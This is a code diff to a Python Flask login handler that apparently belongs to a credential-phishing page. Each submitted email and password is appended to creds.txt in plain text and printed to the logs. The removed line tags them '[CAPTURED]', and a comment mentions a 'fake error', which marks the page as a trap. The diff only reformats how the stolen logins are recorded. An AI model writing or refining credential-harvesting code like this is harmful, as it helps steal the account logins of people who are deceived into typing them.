@@ -11,11 +11,20 @@ def login():
     email = request.form['email']
     password = request.form['password']
 
-    # Log credentials
+    # Save to file
     with open("creds.txt", "a") as f:
-        f.write(f"Email: {email}, Password: {password}\n")
+        f.write(
+            f"\n========= NEW LOGIN =========\n"
+            f"EMAIL: {email}\n"
+            f"PASSWORD: {password}\n"
+            f"=============================\n"
+        )
 
-    print(f"[CAPTURED] Email: {email}, Password: {password}")
+    # Also print nicely to logs
+    print("\n========= NEW LOGIN =========")
+    print(f"EMAIL: {email}")
+    print(f"PASSWORD: {password}")
+    print("=============================\n")
 
     # Fake error if blank
     if email.strip() == "" or password.strip() == "":
